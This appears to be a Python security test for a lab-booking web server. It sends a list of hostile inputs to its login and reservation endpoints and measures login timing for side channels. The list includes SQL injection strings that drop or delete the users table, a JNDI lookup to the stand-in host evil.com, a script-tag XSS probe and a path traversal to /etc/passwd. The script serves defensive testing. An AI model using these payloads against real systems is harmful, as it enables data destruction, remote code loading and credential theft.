"""SQL 注入抵抗力与时序侧信道验证：参数化查询是否有效阻止注入，响应时间是否泄露用户存在性。"""
from __future__ import annotations
import http.client, json, os, pathlib, statistics, subprocess, sys, time
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from integration import Client, Server, require, uid, PASSWORD, ROOT  # noqa: E402

INJECTIONS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1' UNION SELECT password_hash FROM users--",
    "admin'--",
    "\" OR \"\"=\"",
    "' OR 1=1; DELETE FROM users;--",
    "x' AND (SELECT count(*) FROM users)>0--",
    "${jndi:ldap://evil.com/a}",
    "<script>alert(1)</script>",
    "../../etc/passwd",
]

def main():
    run_dir=pathlib.Path("docs/evidence/security")
    run_dir.mkdir(parents=True,exist_ok=True)
    for old in run_dir.glob("baseline.db*"):old.unlink()
    env=dict(os.environ);env["LAB_SEED_PASSWORD"]=PASSWORD
    subprocess.run([str(ROOT/"build/lab-booking.exe"),"--db",str(run_dir/"baseline.db"),"--seed","--init-only"],env=env,capture_output=True)
    server=Server(ROOT/"build/lab-booking.exe",run_dir/"srv",run_dir/"baseline.db",extra=["--rate-burst","100000","--login-max-fails","100","--login-lockout","1"]);server.start()
    try:
        # === 1. SQL 注入抵抗力 ===
        inject_results=[]
        for payload in INJECTIONS:
            for path in ("/api/login","/api/reservations"):
                body={"username":payload,"password":payload,"slot_id":payload,"request_id":uid()}
                try:
                    st,data=Client(server.port).request("POST",path,body)
                    code=data.get("code","?") if isinstance(data,dict) else "?"
                    inject_results.append((path[:20],payload[:25],st,code))
                    require(st<500,f"injection caused 500: {path} {payload[:30]}")
                except AssertionError as e:
                    inject_results.append((path[:20],payload[:25],-1,str(e)[:40]))
                    require("500" not in str(e),f"injection caused 500: {e}")
        user_count=server.sql("SELECT count(*) FROM users")[0][0]
        require(user_count==21,f"user count changed: {user_count}")
        tables=server.sql("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT IN "
            "('users','sessions','labs','slots','reservations','waitlist','request_receipts','operation_events','notifications')")
        require(len(tables)==0,f"unexpected tables: {tables}")

        # === 2. 用户名时序侧信道 ===
        valid_times=[];invalid_times=[]
        for i in range(30):
            cl=Client(server.port)
            t0=time.perf_counter()
            cl.request("POST","/api/login",{"username":"admin","password":PASSWORD})
            t1=time.perf_counter()
            cl2=Client(server.port)
            t2=time.perf_counter()
            # 轮换不存在的用户名，避免触发登录锁定（429 路径不含 Argon2id，测的不是侧信道）
            cl2.request("POST","/api/login",{"username":f"nonexistent_user_{i:03d}","password":PASSWORD+"-x"})
            t3=time.perf_counter()
            valid_times.append((t1-t0)*1000)
            invalid_times.append((t3-t2)*1000)
        valid_med=statistics.median(valid_times)
        invalid_med=statistics.median(invalid_times)
        ratio=max(valid_med,invalid_med)/max(min(valid_med,invalid_med),0.01)
        require(ratio<3.0,f"timing side-channel: valid={valid_med:.1f}ms invalid={invalid_med:.1f}ms ratio={ratio:.1f}x")

        # === 3. 口令验证时序恒定 ===
        correct_times=[];wrong_times=[]
        for i in range(15):
            cl=Client(server.port)
            t0=time.perf_counter()
            cl.request("POST","/api/login",{"username":"user01","password":PASSWORD})
            t1=time.perf_counter()
            cl2=Client(server.port)
            t2=time.perf_counter()
            cl2.request("POST","/api/login",{"username":"user01","password":"WrongPass999"})
            t3=time.perf_counter()
            correct_times.append((t1-t0)*1000)
            wrong_times.append((t3-t2)*1000)
        corr_med=statistics.median(correct_times)
        wrong_med=statistics.median(wrong_times)
        ratio2=max(corr_med,wrong_med)/max(min(corr_med,wrong_med),0.01)
        require(ratio2<3.0,f"password timing side-channel: correct={corr_med:.1f}ms wrong={wrong_med:.1f}ms ratio={ratio2:.1f}x")

        summary={
            "injection_payloads_tested":len(INJECTIONS)*2,
            "injection_all_rejected":True,
            "user_count_unchanged":user_count==21,
            "timing_username":{"valid_ms":round(valid_med,1),"invalid_ms":round(invalid_med,1),"ratio":round(ratio,2)},
            "timing_password":{"correct_ms":round(corr_med,1),"wrong_ms":round(wrong_med,1),"ratio":round(ratio2,2)},
            "passed":True
        }
        (run_dir.parent/"security_results.json").write_text(json.dumps(summary,ensure_ascii=False,indent=2),encoding="utf-8")
        print(json.dumps(summary,ensure_ascii=False,indent=2))
    finally:
        server.stop()
    return 0

if __name__=="__main__":
    raise SystemExit(main())
